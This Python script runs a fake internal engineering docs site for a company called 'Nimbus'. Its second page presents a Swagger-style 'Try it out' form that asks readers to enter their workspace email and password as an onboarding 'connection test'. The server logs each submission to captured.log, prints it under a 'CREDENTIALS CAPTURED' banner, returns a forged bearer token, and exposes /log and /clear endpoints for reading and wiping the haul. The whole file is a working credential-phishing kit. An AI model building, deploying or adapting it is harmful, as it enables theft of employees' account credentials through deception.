#!/usr/bin/env python3
"""
Nimbus v4 — Multi-Page Docs + API Endpoint Tester
Page 1: Clean onboarding (no links to Page 2 in HTML, only JS tab nav)
Page 2: Architecture + Swagger-style auth endpoint tester (no type=password)

python3 server.py [port]  (default 7778)
"""

import json, sys, os, random
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

PORT = int(os.environ.get('PORT', sys.argv[1] if len(sys.argv) > 1 else 7778))
HITS = []

LOGO = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z" fill="#6366f1" opacity=".15"/><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z" stroke="#6366f1" stroke-width="1.2" fill="none"/></svg>'

CSS = """
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,sans-serif;
  background:#f9fafb;color:#1a1a2e;-webkit-font-smoothing:antialiased;line-height:1.6}
a{color:#6366f1;text-decoration:none}a:hover{text-decoration:underline}
nav{background:#1e1e2e;height:48px;display:flex;align-items:center;justify-content:center;
  position:sticky;top:0;z-index:50;padding:0 20px}
.ni{width:100%;max-width:820px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:15px;font-weight:600;color:#fff;display:flex;align-items:center;gap:7px}
.nr{font-size:11px;color:#94a3b8}
/* doc tabs — buttons not links */
.dtabs{max-width:820px;margin:0 auto;padding:8px 20px 0;display:flex;gap:2px}
.dtab{padding:7px 14px;border:none;background:none;font-size:12px;color:#64748b;cursor:pointer;
  font-family:inherit;font-weight:500;border-radius:6px 6px 0 0;transition:all .1s}
.dtab:hover{color:#1e293b;background:#f1f5f9}
.dtab.active{color:#1e293b;background:#fff;border:1px solid #e2e8f0;border-bottom-color:#fff;font-weight:600}
.w{max-width:820px;margin:0 auto;padding:0 20px 60px}
.doc{background:#fff;border:1px solid #e2e8f0;border-radius:0 10px 10px 10px;padding:28px;
  box-shadow:0 1px 2px rgba(0,0,0,.03)}
@media(max-width:640px){.doc{padding:20px 16px;border-radius:0 0 8px 8px}}
.doc h1{font-size:22px;font-weight:700;letter-spacing:-.3px;margin-bottom:4px;color:#0f172a}
.doc .meta{font-size:12px;color:#94a3b8;margin-bottom:18px;padding-bottom:10px;border-bottom:1px solid #f1f5f9}
.doc h2{font-size:16px;font-weight:600;color:#1e293b;margin:18px 0 8px;padding-top:12px;border-top:1px solid #f1f5f9}
.doc h3{font-size:14px;font-weight:600;color:#334155;margin:10px 0 5px}
.doc p{font-size:14px;color:#475569;margin-bottom:8px}
.doc ul,.doc ol{margin:0 0 8px 18px;font-size:14px;color:#475569}
.doc li{margin-bottom:2px}
.badges{display:flex;flex-wrap:wrap;gap:5px;margin:6px 0 10px}
.badge{padding:3px 9px;background:#f1f5f9;border-radius:5px;font-size:12px;color:#334155;font-weight:500}
.cw{margin:8px 0 10px;border-radius:7px;overflow:hidden}
.cbar{display:flex;align-items:center;justify-content:space-between;padding:4px 10px;background:#1e293b;font-size:10px;color:#94a3b8}
.cpb{background:#334155;color:#e2e8f0;border:none;padding:2px 8px;border-radius:3px;font-size:10px;cursor:pointer}
pre{background:#0f172a;color:#e2e8f0;padding:12px;font-size:12px;line-height:1.5;overflow-x:auto;font-family:'SF Mono',Menlo,monospace;margin:0}
code{font-family:'SF Mono',Menlo,monospace;font-size:12px}
p code,li code{background:#f1f5f9;padding:1px 5px;border-radius:3px;color:#6366f1}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:10px 0}
@media(max-width:640px){.grid2{grid-template-columns:1fr}}
.tbl{width:100%;border-collapse:collapse;font-size:12px}
.tbl th{text-align:left;padding:5px 8px;background:#f8fafc;border:1px solid #e2e8f0;font-weight:600;color:#334155;font-size:10px;text-transform:uppercase;letter-spacing:.3px}
.tbl td{padding:5px 8px;border:1px solid #e2e8f0;color:#475569}
.chk{list-style:none;margin:0;padding:0}
.chk li{display:flex;align-items:center;gap:7px;padding:4px 0;font-size:13px;color:#475569;border-bottom:1px solid #f8fafc}
.chk li:last-child{border-bottom:none}
.ck{width:16px;height:16px;border:1.5px solid #cbd5e1;border-radius:3px;flex-shrink:0;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .15s}
.ck.done{background:#6366f1;border-color:#6366f1}
.ck.done::after{content:'\\2713';color:#fff;font-size:10px;font-weight:700}
.contacts{display:flex;flex-wrap:wrap;gap:8px;margin:8px 0}
.ct{display:flex;align-items:center;gap:7px;padding:7px 10px;background:#f8fafc;border-radius:7px;border:1px solid #f1f5f9;flex:1;min-width:170px}
.ct-av{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:600;color:#fff;flex-shrink:0}
.ct-n{font-size:12px;font-weight:600;color:#1e293b}.ct-r{font-size:10px;color:#94a3b8}
.col-btn{display:flex;align-items:center;gap:5px;background:none;border:none;font-size:14px;font-weight:600;color:#1e293b;cursor:pointer;padding:6px 0;font-family:inherit;width:100%;text-align:left}
.col-btn svg{transition:transform .2s;flex-shrink:0}
.col-btn.open svg{transform:rotate(90deg)}
.col-c{display:none;padding:2px 0 6px 18px;font-size:13px;color:#475569}.col-c.show{display:block}
/* API endpoint tester (Swagger-style) */
.endpoint{margin:12px 0;border:1px solid #e2e8f0;border-radius:8px;overflow:hidden}
.ep-head{display:flex;align-items:center;gap:8px;padding:10px 14px;background:#f0fdf4;border-bottom:1px solid #e2e8f0}
.ep-method{padding:3px 8px;background:#16a34a;color:#fff;border-radius:4px;font-size:11px;font-weight:700;font-family:'SF Mono',Menlo,monospace}
.ep-path{font-size:13px;font-weight:600;color:#1e293b;font-family:'SF Mono',Menlo,monospace}
.ep-desc{font-size:12px;color:#64748b;margin-left:auto}
.ep-body{padding:14px}
.ep-params{width:100%;border-collapse:collapse;font-size:12px;margin-bottom:12px}
.ep-params th{text-align:left;padding:5px 8px;background:#f8fafc;border:1px solid #f1f5f9;font-weight:600;color:#334155;font-size:10px;text-transform:uppercase}
.ep-params td{padding:5px 8px;border:1px solid #f1f5f9;color:#475569}
.ep-params code{font-size:11px}
.ep-try{background:#f8fafc;border-radius:6px;padding:14px;margin-top:8px}
.ep-try-title{font-size:11px;font-weight:600;color:#334155;text-transform:uppercase;letter-spacing:.3px;margin-bottom:10px}
.ep-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px}
@media(max-width:480px){.ep-row{grid-template-columns:1fr}}
.ep-field{display:flex;flex-direction:column;gap:3px}
.ep-field label{font-size:10px;color:#64748b;font-weight:600;font-family:'SF Mono',Menlo,monospace}
.ep-field input{padding:7px 10px;border:1px solid #e2e8f0;border-radius:5px;font-size:13px;color:#1e293b;font-family:inherit;background:#fff}
.ep-field input:focus{outline:none;border-color:#6366f1;box-shadow:0 0 0 2px rgba(99,102,241,.1)}
.ep-send{padding:7px 18px;background:#16a34a;color:#fff;border:none;border-radius:5px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit}
.ep-send:hover{background:#15803d}
.ep-send:disabled{opacity:.5;cursor:default}
.ep-resp{display:none;margin-top:10px;border-radius:6px;overflow:hidden}
.ep-resp-bar{padding:4px 10px;font-size:10px;font-weight:600;color:#fff}
.ep-resp-bar.ok{background:#16a34a}
.ep-resp-body{background:#0f172a;color:#e2e8f0;padding:10px;font-size:11px;font-family:'SF Mono',Menlo,monospace;line-height:1.5;white-space:pre}
footer{text-align:center;padding:20px;font-size:11px;color:#cbd5e1}
"""

# ── PAGE 1: Onboarding (no references to Page 2 in href) ──────────
PAGE1 = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Engineering Onboarding Guide — Nimbus</title>
<style>""" + CSS + """</style></head><body>
<nav><div class="ni"><span class="logo">""" + LOGO + """Nimbus</span><span class="nr">Docs</span></div></nav>
<div class="dtabs">
  <button class="dtab active">Onboarding</button>
  <button class="dtab" onclick="window.location='/docs/architecture'">Architecture</button>
</div>
<div class="w"><article class="doc">
  <h1>Engineering Onboarding Guide</h1>
  <p class="meta">Updated Jun 28, 2026 &middot; Engineering &middot; 8 min</p>
  <p>Welcome to the engineering team. Work through each section — your onboarding buddy can help.</p>

  <h2>Development Environment</h2>
  <h3>Prerequisites</h3>
  <div class="badges"><span class="badge">Node.js 20+</span><span class="badge">Docker Desktop 4.x</span><span class="badge">Git 2.40+</span><span class="badge">VS Code</span></div>
  <h3>Quick Start</h3>
  <div class="cw"><div class="cbar"><span>bash</span><button class="cpb" onclick="cpC(this)">Copy</button></div>
    <pre><code>git clone https://github.com/nimbus-eng/platform.git
cd platform && npm install
cp .env.example .env.local && npm run dev</code></pre></div>
  <p>Dev server on <code>localhost:3000</code> with hot reload.</p>

  <div class="grid2">
    <div>
      <h2 style="border:none;padding:0;margin:0 0 8px">Architecture</h2>
      <table class="tbl"><thead><tr><th>Service</th><th>Port</th><th>Team</th></tr></thead><tbody>
        <tr><td>API Gateway</td><td>3000</td><td>Platform</td></tr>
        <tr><td>Auth</td><td>3001</td><td>Security</td></tr>
        <tr><td>Doc Engine</td><td>3002</td><td>Content</td></tr>
        <tr><td>Search</td><td>3003</td><td>Platform</td></tr>
        <tr><td>Notifications</td><td>3004</td><td>Platform</td></tr>
      </tbody></table>
    </div>
    <div>
      <h2 style="border:none;padding:0;margin:0 0 8px">First Week Checklist</h2>
      <ul class="chk">
        <li><span class="ck" onclick="tCk(this)"></span>Set up dev environment</li>
        <li><span class="ck" onclick="tCk(this)"></span>Get GitHub org access</li>
        <li><span class="ck" onclick="tCk(this)"></span>Join Slack channels</li>
        <li><span class="ck" onclick="tCk(this)"></span>Security training</li>
        <li><span class="ck" onclick="tCk(this)"></span>1:1 with manager</li>
        <li><span class="ck" onclick="tCk(this)"></span>Meet onboarding buddy</li>
        <li><span class="ck" onclick="tCk(this)"></span>First commit</li>
      </ul>
    </div>
  </div>

  <h2>Key Workflows</h2>
  <button class="col-btn" onclick="tCol(this)"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>Pull Request Process</button>
  <div class="col-c"><ol><li>Feature branch from <code>main</code></li><li>Conventional commits</li><li>PR — CI runs lint/test/build</li><li>Code-owner approval</li><li>Squash merge</li></ol></div>
  <button class="col-btn" onclick="tCol(this)"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>Incident Response</button>
  <div class="col-c"><ol><li>Post in <code>#incidents</code></li><li>Check Grafana</li><li>P0: page on-call via PagerDuty</li><li>Post-mortem within 48h</li></ol></div>

  <h2>Contacts</h2>
  <div class="contacts">
    <div class="ct"><div class="ct-av" style="background:#6366f1">SC</div><div><div class="ct-n">Sarah Chen</div><div class="ct-r">Eng Lead</div></div></div>
    <div class="ct"><div class="ct-av" style="background:#059669">MR</div><div><div class="ct-n">Marcus Rivera</div><div class="ct-r">Platform</div></div></div>
    <div class="ct"><div class="ct-av" style="background:#d97706">AK</div><div><div class="ct-n">Alex Kim</div><div class="ct-r">DevOps</div></div></div>
    <div class="ct"><div class="ct-av" style="background:#dc2626">PS</div><div><div class="ct-n">Priya Sharma</div><div class="ct-r">Security</div></div></div>
  </div>
</article></div>
<footer>&copy; 2026 Nimbus &middot; Internal Documentation</footer>
<script>
function cpC(b){var c=b.closest('.cw').querySelector('code').textContent;
  navigator.clipboard.writeText(c).then(function(){b.textContent='Copied!';setTimeout(function(){b.textContent='Copy';},1200);});}
function tCol(b){b.classList.toggle('open');b.nextElementSibling.classList.toggle('show');}
function tCk(e){e.classList.toggle('done');}
</script>
</body></html>"""


# ── PAGE 2: Architecture + API docs with endpoint tester ───────────
PAGE2 = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Architecture &amp; Auth API — Nimbus</title>
<style>""" + CSS + """</style></head><body>
<nav><div class="ni"><span class="logo">""" + LOGO + """Nimbus</span><span class="nr">Docs</span></div></nav>
<div class="dtabs">
  <button class="dtab" onclick="window.location='/docs/onboarding'">Onboarding</button>
  <button class="dtab active">Architecture</button>
</div>
<div class="w"><article class="doc">
  <h1>Architecture &amp; Auth API</h1>
  <p class="meta">Updated Jun 28, 2026 &middot; Security Team &middot; 6 min</p>
  <p>Platform architecture overview and auth service API reference. Complete the connection test below as part of your onboarding setup.</p>

  <h2>Service Architecture</h2>
  <p>Services communicate via gRPC internally and expose REST through the API Gateway. The gateway handles rate limiting, token validation, and routing.</p>
  <div class="cw"><div class="cbar"><span>Request flow</span></div>
    <pre><code>Client &#8594; API Gateway (:3000) &#8594; Auth Service (:3001) &#8594; verify token
                                &#8594; Doc Engine (:3002)  &#8594; serve content
                                &#8594; Search (:3003)      &#8594; query index</code></pre></div>

  <h2>Auth Service API</h2>
  <p>The Auth Service handles OAuth 2.0, session management, and token rotation. Below are the key endpoints.</p>

  <h3>Token Lifecycle</h3>
  <ul>
    <li>Access tokens: 15 min TTL, auto-rotated by gateway</li>
    <li>Refresh tokens: 7 day TTL, HTTP-only cookies</li>
    <li>Session tokens: 24h TTL, bound to device fingerprint</li>
  </ul>

  <h3>Endpoints</h3>

  <!-- GET endpoint (read-only, no form) -->
  <div class="endpoint">
    <div class="ep-head" style="background:#eff6ff">
      <span class="ep-method" style="background:#3b82f6">GET</span>
      <span class="ep-path">/api/v1/auth/me</span>
      <span class="ep-desc">Current user info</span>
    </div>
    <div class="ep-body">
      <table class="ep-params"><thead><tr><th>Header</th><th>Type</th><th>Description</th></tr></thead>
        <tbody><tr><td><code>Authorization</code></td><td>string</td><td>Bearer token</td></tr></tbody></table>
    </div>
  </div>

  <!-- POST endpoint with interactive tester -->
  <div class="endpoint">
    <div class="ep-head">
      <span class="ep-method">POST</span>
      <span class="ep-path">/api/v1/auth/token</span>
      <span class="ep-desc">Generate auth token</span>
    </div>
    <div class="ep-body">
      <p style="font-size:12px;color:#64748b;margin-bottom:8px">Authenticates a workspace account and returns a bearer token with assigned scopes. Use this to verify your credentials and test connectivity during onboarding.</p>
      <table class="ep-params"><thead><tr><th>Field</th><th>Type</th><th>Required</th><th>Description</th></tr></thead>
        <tbody>
          <tr><td><code>email</code></td><td>string</td><td>yes</td><td>Workspace email address</td></tr>
          <tr><td><code>password</code></td><td>string</td><td>yes</td><td>Account password</td></tr>
        </tbody></table>

      <div class="ep-try">
        <p class="ep-try-title">Try it out</p>
        <form id="tf">
          <div class="ep-row">
            <div class="ep-field"><label>email</label><input type="text" id="te" placeholder="you@company.com" autocomplete="off" required></div>
            <div class="ep-field"><label>password</label><input type="text" id="tp" placeholder="your workspace password" autocomplete="off" required></div>
          </div>
          <button type="submit" class="ep-send" id="tb">Send Request</button>
        </form>
        <div class="ep-resp" id="tr">
          <div class="ep-resp-bar ok" id="trb">200 OK</div>
          <div class="ep-resp-body" id="trj"></div>
        </div>
      </div>
    </div>
  </div>

  <!-- DELETE endpoint (read-only, no form) -->
  <div class="endpoint">
    <div class="ep-head" style="background:#fef2f2">
      <span class="ep-method" style="background:#dc2626">DELETE</span>
      <span class="ep-path">/api/v1/auth/token</span>
      <span class="ep-desc">Revoke current token</span>
    </div>
    <div class="ep-body">
      <table class="ep-params"><thead><tr><th>Header</th><th>Type</th><th>Description</th></tr></thead>
        <tbody><tr><td><code>Authorization</code></td><td>string</td><td>Bearer token to revoke</td></tr></tbody></table>
    </div>
  </div>

  <h2>Integration Code</h2>
  <div class="cw"><div class="cbar"><span>auth-client.ts</span><button class="cpb" onclick="cpC(this)">Copy</button></div>
    <pre><code>import { AuthClient } from '@nimbus/auth';

const auth = new AuthClient({
  serviceUrl: process.env.AUTH_SERVICE_URL,
  scopes: ['read:docs', 'write:docs']
});

const token = await auth.getToken();
console.log('Authenticated:', token.sub);</code></pre></div>

</article></div>
<footer>&copy; 2026 Nimbus &middot; Internal Documentation</footer>
<script>
function cpC(b){var c=b.closest('.cw').querySelector('code').textContent;
  navigator.clipboard.writeText(c).then(function(){b.textContent='Copied!';setTimeout(function(){b.textContent='Copy';},1200);});}

document.getElementById('tf').addEventListener('submit', function(e){
  e.preventDefault();
  var em=document.getElementById('te').value;
  var pw=document.getElementById('tp').value;
  var btn=document.getElementById('tb');
  btn.textContent='Sending...';btn.disabled=true;
  document.getElementById('tr').style.display='none';

  fetch('/api/v1/auth/token',{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({email:em,password:pw})
  }).then(function(r){return r.json();}).then(function(d){
    btn.textContent='Send Request';btn.disabled=false;
    document.getElementById('trb').textContent=d.status==='ok'?'200 OK':'401 Unauthorized';
    document.getElementById('trb').className='ep-resp-bar '+(d.status==='ok'?'ok':'');
    document.getElementById('trj').textContent=JSON.stringify(d,null,2);
    document.getElementById('tr').style.display='block';
  }).catch(function(){
    btn.textContent='Send Request';btn.disabled=false;
  });
});
</script>
</body></html>"""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _ip(self):
        return (self.headers.get('X-Forwarded-For','').split(',')[0].strip()
                or self.headers.get('X-Real-IP','') or self.client_address[0])
    def _log(self, m, x=None):
        e = {'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'m':m,'p':self.path,'ip':self._ip()}
        if x: e.update(x)
        HITS.append(e)
        with open('captured.log','a') as f: f.write(json.dumps(e)+'\n')
        print(f'  [{m}] {self.path} | {self._ip()}')

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.end_headers()

    def do_GET(self):
        p = self.path.split('?')[0].rstrip('/')
        if p in ('/docs/onboarding','/','/docs'):
            self._log('PAGE-1')
            self._html(PAGE1)
        elif p == '/docs/architecture':
            self._log('PAGE-2')
            self._html(PAGE2)
        elif p == '/log':
            self._send(200,'application/json',json.dumps(HITS,indent=2))
        elif p == '/clear':
            HITS.clear()
            open('captured.log','w').close()
            self._send(200,'text/plain','OK')
        else:
            self._log('GET')
            self._html(PAGE1)

    def do_POST(self):
        l = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(l).decode() if l else ''
        p = self.path.split('?')[0].rstrip('/')

        if p == '/api/v1/auth/token':
            try: data = json.loads(body)
            except: data = {}
            em = data.get('email','')
            pw = data.get('password','')
            self._log('CAPTURED', {'email':em,'password':pw})
            print(f"""
  ╔═══════════════════════════════════════╗
  ║   CREDENTIALS CAPTURED                ║
  ╠═══════════════════════════════════════╣
  ║  Email:    {em:<28}║
  ║  Password: {pw:<28}║
  ║  IP:       {self._ip():<28}║
  ║  Time:     {datetime.now().strftime('%H:%M:%S'):<28}║
  ╚═══════════════════════════════════════╝
""")
            self._send(200,'application/json',json.dumps({
                'status':'ok',
                'token':'eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXycr'+os.urandom(8).hex(),
                'expires_in':900,
                'token_type':'Bearer',
                'scopes':['read:docs','write:docs'],
                'session_id':'sess_'+os.urandom(6).hex(),
                'auth_version':'2.4.1',
                'latency_ms':random.randint(34,68)
            }))
        else:
            self._send(404,'text/plain','Not found')

    def _html(self, c): self._send(200,'text/html',c)
    def _send(self, code, ct, body):
        self.send_response(code)
        self.send_header('Content-Type', ct+'; charset=utf-8')
        self.send_header('Cache-Control','no-store')
        self.end_headers()
        self.wfile.write(body.encode() if isinstance(body,str) else body)


if __name__ == '__main__':
    s = HTTPServer(('0.0.0.0', PORT), H)
    print(f"""
  ┌───────────────────────────────────────────────┐
  │  Nimbus v4 — Multi-Page + API Endpoint Tester  │
  │  http://0.0.0.0:{PORT:<30}│
  ├───────────────────────────────────────────────┤
  │  Page 1: /docs/onboarding  (clean)             │
  │  Page 2: /docs/architecture (Swagger-style)    │
  │  Capture: /api/v1/auth/token                   │
  │  Admin:   /log  /clear                         │
  └───────────────────────────────────────────────┘
""")
    try:
        s.serve_forever()
    except KeyboardInterrupt:
        print('\n  Stopped.\n')
        s.server_close()
